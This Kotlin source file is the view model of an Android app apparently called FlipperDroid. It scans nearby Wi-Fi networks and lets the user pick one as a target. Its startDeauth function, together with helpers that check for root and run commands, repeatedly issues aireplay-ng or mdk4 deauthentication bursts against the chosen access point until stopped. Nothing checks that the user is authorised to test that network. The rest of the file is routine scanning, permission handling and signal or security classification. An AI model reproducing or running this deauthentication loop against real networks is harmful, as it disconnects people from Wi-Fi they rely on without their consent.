package com.example.flipperdroid.viewmodel

import android.Manifest
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Data representing a Wifi network
 *
 * @param ssid Name of the Wifi network
 * @param bssid MAC address of the access point
 * @param rssi Signal level in dBm
 * @param frequency Radio frequency in MHz
 * @param capabilities Capabilities and security of the network
 * @param lastSeen Time of detection formatted as a string
 * @param channel Radio channel computed from the frequency
 */
data class WifiNetwork(
    val ssid: String,
    val bssid: String,
    val rssi: Int,
    val frequency: Int,
    val capabilities: String,
    val lastSeen: String,
    val channel: Int = frequencyToChannel(frequency)
) {
    companion object {
        fun fromScanResult(scanResult: ScanResult): WifiNetwork {
            val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
            return WifiNetwork(
                ssid = if (scanResult.SSID.isNullOrEmpty()) "<Hidden Network>" else scanResult.SSID,
                bssid = scanResult.BSSID,
                rssi = scanResult.level,
                frequency = scanResult.frequency,
                capabilities = scanResult.capabilities,
                lastSeen = dateFormat.format(Date())
            )
        }

        /** Delegates to the single (2.4 / 5 / 6 GHz) computation in [com.example.flipperdroid.util.WifiChannels]. */
        fun frequencyToChannel(frequency: Int): Int =
            com.example.flipperdroid.util.WifiChannels.frequencyToChannel(frequency)
    }
}

/**
 * ViewModel handling the detection of Wifi networks and the reading of scan results
 *
 * Handles detection, the list of available networks, the scan state and permissions
 */
class WifiDeautherViewModel : ViewModel() {
    private var wifiManager: WifiManager? = null

    @SuppressLint("StaticFieldLeak")
    private var context: Context? = null

    private var scanReceiver: BroadcastReceiver? = null

    private val _networks = MutableStateFlow<List<WifiNetwork>>(emptyList())
    val networks: StateFlow<List<WifiNetwork>> = _networks

    private val _isScanning = MutableStateFlow(false)
    val isScanning: StateFlow<Boolean> = _isScanning

    private val _permissionsGranted = MutableStateFlow(false)
    val permissionsGranted: StateFlow<Boolean> = _permissionsGranted

    // Network currently selected as target
    private val _selectedNetwork = MutableStateFlow<WifiNetwork?>(null)
    val selectedNetwork: StateFlow<WifiNetwork?> = _selectedNetwork

    // State and log of the deauth attack
    private val _isDeauthing = MutableStateFlow(false)
    val isDeauthing: StateFlow<Boolean> = _isDeauthing

    private val _deauthStatus = MutableStateFlow<String>("")
    val deauthStatus: StateFlow<String> = _deauthStatus

    private var deauthJob: Job? = null

    // NEARBY_WIFI_DEVICES only exists (and can only be granted) from Android 13 (API 33).
    // Requiring it unconditionally blocked the scan on earlier versions: the permission
    // was never granted, so "all granted" stayed false.
    private val requiredPermissions: List<String> = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.ACCESS_WIFI_STATE)
        add(Manifest.permission.CHANGE_WIFI_STATE)
        add(Manifest.permission.ACCESS_NETWORK_STATE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.NEARBY_WIFI_DEVICES)
        }
    }

    /**
     * Initializes the ViewModel with the context and configures the WifiManager and the BroadcastReceiver
     *
     * @param context Android Context
     */

    fun initialize(context: Context) {
        // Application context: this ViewModel lives in MainActivity and survives recreations.
        this.context = context.applicationContext
        wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        setupScanReceiver()
        checkPermissions()
    }
    /**
     * Configures and registers the BroadcastReceiver to intercept Wifi scan results
     */
    private fun setupScanReceiver() {
        try {
            scanReceiver?.let { receiver ->
                context?.unregisterReceiver(receiver)
            }
        } catch (e: Exception) {
            Log.e("WifiDeauther", "Error unregistering existing receiver", e)
        }

        scanReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    WifiManager.SCAN_RESULTS_AVAILABLE_ACTION -> {
                        val success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
                        Log.d("WifiDeauther", "Scan results received. Success: $success")
                        if (success) {
                            scanSuccess()
                        } else {
                            scanFailure()
                        }
                    }
                }
            }
        }

        context?.registerReceiver(
            scanReceiver,
            IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        )
    }
    /**
     * Handles the scan results when they are available
     */
    private fun scanSuccess() {
        viewModelScope.launch {
            try {
                wifiManager?.let { wifi ->
                    val results = wifi.scanResults
                    Log.d("WifiDeauther", "Scan success, found ${results.size} networks")
                    results.forEach { result ->
                        Log.d("WifiDeauther", "Network: SSID=${result.SSID}, BSSID=${result.BSSID}, RSSI=${result.level}, Capabilities=${result.capabilities}")
                    }
                    
                    if (results.isEmpty()) {
                        Log.w("WifiDeauther", "No networks found in scan results")
                        // Try to get cached results
                        scanFailure()
                        return@launch
                    }

                    val networks = results
                        .filter { !it.SSID.isNullOrEmpty() && !it.BSSID.isNullOrEmpty() }
                        .map { WifiNetwork.fromScanResult(it) }
                        .distinctBy { it.bssid }
                        .sortedByDescending { it.rssi }
                    
                    Log.d("WifiDeauther", "Emitting ${networks.size} networks")
                    _networks.emit(networks)
                } ?: run {
                    Log.e("WifiDeauther", "WifiManager is null")
                }
            } catch (e: SecurityException) {
                Log.e("WifiDeauther", "Security exception during scan success", e)
                _permissionsGranted.emit(false)
            } finally {
                _isScanning.emit(false)
            }
        }
    }

    /**
     * Handles cached or previous results if the scan fails
     */
    private fun scanFailure() {
        viewModelScope.launch {
            try {
                wifiManager?.let { wifi ->
                    val results = wifi.scanResults
                    Log.d("WifiDeauther", "Using cached results, found ${results.size} networks")
                    
                    val networks = results
                        .filter { !it.SSID.isNullOrEmpty() && !it.BSSID.isNullOrEmpty() }
                        .map { WifiNetwork.fromScanResult(it) }
                        .distinctBy { it.bssid }
                        .sortedByDescending { it.rssi }
                    
                    Log.d("WifiDeauther", "Emitting ${networks.size} cached networks")
                    _networks.emit(networks)
                } ?: run {
                    Log.e("WifiDeauther", "WifiManager is null")
                }
            } catch (e: SecurityException) {
                Log.e("WifiDeauther", "Security exception during scan failure", e)
                _permissionsGranted.emit(false)
            } finally {
                _isScanning.emit(false)
            }
        }
    }
    /**
     * Checks whether all required permissions are granted
     * (ACCESS_FINE_LOCATION, ACCESS_WIFI_STATE, etc.)
     */
    private fun checkPermissions() {
        context?.let { ctx ->
            val missingPermissions = requiredPermissions.filter { permission ->
                ContextCompat.checkSelfPermission(ctx, permission) != PackageManager.PERMISSION_GRANTED
            }

            val allGranted = missingPermissions.isEmpty()
            
            Log.d("WifiDeauther", "Permissions check: all granted = $allGranted")
            if (!allGranted) {
                Log.w("WifiDeauther", "Missing permissions: ${missingPermissions.joinToString()}")
            }

            viewModelScope.launch {
                _permissionsGranted.emit(allGranted)
            }
        }
    }

    /**
     * Starts a Wifi scan if permissions are granted and Wifi is enabled
     */
    fun startScan() {
        if (!permissionsGranted.value) {
            Log.d("WifiDeauther", "Cannot start scan: permissions not granted")
            return
        }

        viewModelScope.launch {
            try {
                _isScanning.emit(true)
                wifiManager?.let { wifi ->
                    if (!wifi.isWifiEnabled) {
                        Log.d("WifiDeauther", "WiFi is disabled, enabling...")
                        wifi.isWifiEnabled = true
                        
                        // Wait for WiFi to be enabled
                        var attempts = 0
                        while (!wifi.isWifiEnabled && attempts < 10) {
                            Log.d("WifiDeauther", "Waiting for WiFi to enable... attempt $attempts")
                            kotlinx.coroutines.delay(500)
                            attempts++
                        }

                        if (!wifi.isWifiEnabled) {
                            Log.d("WifiDeauther", "Failed to enable WiFi")
                            _networks.emit(emptyList())
                            _isScanning.emit(false)
                            return@launch
                        }
                    }

                    Log.d("WifiDeauther", "Starting scan...")
                    val scanStarted = wifi.startScan()
                    if (!scanStarted) {
                        Log.w("WifiDeauther", "Failed to start scan, using cached results")
                        scanFailure()
                    } else {
                        Log.d("WifiDeauther", "Scan started successfully")
                    }
                } ?: run {
                    Log.e("WifiDeauther", "WifiManager is null")
                    _isScanning.emit(false)
                }
            } catch (e: SecurityException) {
                Log.e("WifiDeauther", "Security exception during scan start", e)
                _permissionsGranted.emit(false)
                _isScanning.emit(false)
            }
        }
    }

    /**
     * Selects a network as target (triggered on card click).
     */
    fun selectNetwork(network: WifiNetwork) {
        _selectedNetwork.value = network
        _deauthStatus.value = ""
    }

    fun clearSelection() {
        if (_isDeauthing.value) stopDeauth()
        _selectedNetwork.value = null
        _deauthStatus.value = ""
    }

    /**
     * Launches an 802.11 deauthentication attack on the target network.
     *
     * IMPORTANT — Android limitations: a real deauth requires monitor mode and
     * packet injection, which most smartphone Wi-Fi chipsets do not support, even
     * when rooted. This function honestly checks the prerequisites (root + an
     * injection tool mdk4/aireplay-ng) and reports the state, rather than pretending
     * an action took place that does not.
     */
    fun startDeauth(network: WifiNetwork) {
        if (_isDeauthing.value) return
        _selectedNetwork.value = network
        com.example.flipperdroid.util.AppLog.log("Deauth", "Attempt on ${network.ssid} (${network.bssid})")
        deauthJob = viewModelScope.launch(Dispatchers.IO) {
            _isDeauthing.value = true
            _deauthStatus.value = "Checking root access..."

            if (!hasRoot()) {
                _deauthStatus.value = "Root access required. Deauthentication needs root and a Wi-Fi " +
                        "chipset that supports monitor mode + packet injection (most phones don't)."
                _isDeauthing.value = false
                return@launch
            }

            val tool = findDeauthTool()
            if (tool == null) {
                _deauthStatus.value = "Root OK, but no injection tool found (mdk4 / aireplay-ng), and " +
                        "Android Wi-Fi drivers usually block monitor mode. Use an external adapter or an " +
                        "ESP32 companion for real deauth (see roadmap)."
                _isDeauthing.value = false
                return@launch
            }

            // Assumed monitor interface; adapt per device.
            val iface = "wlan0"
            val command = when (tool) {
                // Bounded burst (64 frames) instead of --deauth 0 (infinite): the loop
                // re-launches the command every second, an infinite command would never
                // return.
                "aireplay-ng" -> "aireplay-ng --deauth 64 -a ${network.bssid} $iface"
                else -> "mdk4 $iface d -B ${network.bssid}"
            }
            _deauthStatus.value = "Deauthing ${network.ssid} (${network.bssid}) ch ${network.channel} via $tool..."

            var rounds = 0
            while (isActive && _isDeauthing.value) {
                val rc = runRootCommand(command)
                rounds++
                // Honest status: a non-zero exit code means the tool failed.
                _deauthStatus.value = if (rc == 0) "Burst #$rounds: $tool exited OK"
                    else "Burst #$rounds: $tool failed (exit $rc) — interface not in monitor mode?"
                delay(1000)
            }
        }
    }

    fun stopDeauth() {
        _isDeauthing.value = false
        deauthJob?.cancel()
        deauthJob = null
        if (_deauthStatus.value.isNotEmpty()) {
            _deauthStatus.value = "Deauth stopped."
        }
    }

    /** Checks for root access by running `id` through su. */
    private fun hasRoot(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val output = BufferedReader(InputStreamReader(process.inputStream)).readText()
            process.waitFor()
            output.contains("uid=0")
        } catch (e: Exception) {
            false
        }
    }

    /** Detects an injection tool available in the PATH. */
    private fun findDeauthTool(): String? {
        for (tool in listOf("aireplay-ng", "mdk4")) {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "command -v $tool"))
                val output = BufferedReader(InputStreamReader(process.inputStream)).readText().trim()
                process.waitFor()
                if (output.isNotEmpty()) return tool
            } catch (_: Exception) { /* try the next one */ }
        }
        return null
    }

    /**
     * Runs a root shell command and returns its exit code.
     *
     * Drains stdout/stderr in the background (otherwise a chatty tool fills the pipe
     * buffer and blocks) and bounds the duration of the burst: mdk4 (and aireplay in
     * continuous mode) would run forever and waitFor() would never return.
     */
    private fun runRootCommand(command: String, timeoutMs: Long = 2000): Int {
        var process: Process? = null
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            process = p
            drainStream(p.inputStream)
            drainStream(p.errorStream)
            val watchdog = Thread {
                try { Thread.sleep(timeoutMs) } catch (_: InterruptedException) { return@Thread }
                try { p.destroy() } catch (_: Exception) {}
            }.apply { isDaemon = true; start() }
            val code = p.waitFor()
            watchdog.interrupt()
            code
        } catch (e: Exception) {
            Log.e("WifiDeauther", "Deauth command failed: ${e.message}")
            try { process?.destroy() } catch (_: Exception) {}
            -1
        }
    }

    /** Drains a process stream in the background (daemon thread) to avoid blocking. */
    private fun drainStream(stream: java.io.InputStream) {
        Thread {
            try { stream.bufferedReader().use { r -> while (r.readLine() != null) { /* ignore */ } } }
            catch (_: Exception) {}
        }.apply { isDaemon = true; start() }
    }

    override fun onCleared() {
        super.onCleared()
        stopDeauth()
        try {
            scanReceiver?.let { receiver ->
                context?.unregisterReceiver(receiver)
            }
        } catch (e: Exception) {
            Log.e("WifiDeauther", "Error unregistering receiver", e)
        }
    }

    /**
     * Returns a qualitative evaluation of the Wifi signal strength
     *
     * @param rssi Signal level in dBm
     * @return Enum representing the signal quality
     */
    fun getNetworkStrength(rssi: Int): NetworkStrength {
        return when {
            rssi >= -50 -> NetworkStrength.EXCELLENT
            rssi >= -60 -> NetworkStrength.GOOD
            rssi >= -70 -> NetworkStrength.FAIR
            else -> NetworkStrength.POOR
        }
    }
    /**
     * Analyzes the capabilities string to determine the Wifi network security type
     *
     * @param capabilities Capabilities string of the network
     * @return Enum representing the security type
     */
    fun getSecurityType(capabilities: String): SecurityType {
        return when (com.example.flipperdroid.util.WifiSecurityClassifier.classify(capabilities)) {
            com.example.flipperdroid.util.WifiSecurity.OPEN -> SecurityType.OPEN
            com.example.flipperdroid.util.WifiSecurity.OWE -> SecurityType.OWE
            com.example.flipperdroid.util.WifiSecurity.WEP -> SecurityType.WEP
            com.example.flipperdroid.util.WifiSecurity.WPA -> SecurityType.WPA
            com.example.flipperdroid.util.WifiSecurity.WPA2 -> SecurityType.WPA2
            com.example.flipperdroid.util.WifiSecurity.WPA3 -> SecurityType.WPA3
            com.example.flipperdroid.util.WifiSecurity.WPA3_TRANSITION -> SecurityType.WPA3_TRANSITION
        }
    }

    /**
     * Enriched security label (WPA3-SAE, OWE, WPA2/WPA3 transition), with the
     * Enterprise (EAP) and WPS flags that widen the attack surface.
     */
    fun getSecurityLabel(capabilities: String): String =
        com.example.flipperdroid.util.WifiSecurityClassifier.label(capabilities)
}

enum class NetworkStrength {
    EXCELLENT,
    GOOD,
    FAIR,
    POOR
}

enum class SecurityType {
    OPEN,
    OWE,
    WEP,
    WPA,
    WPA2,
    WPA3,
    WPA3_TRANSITION
} 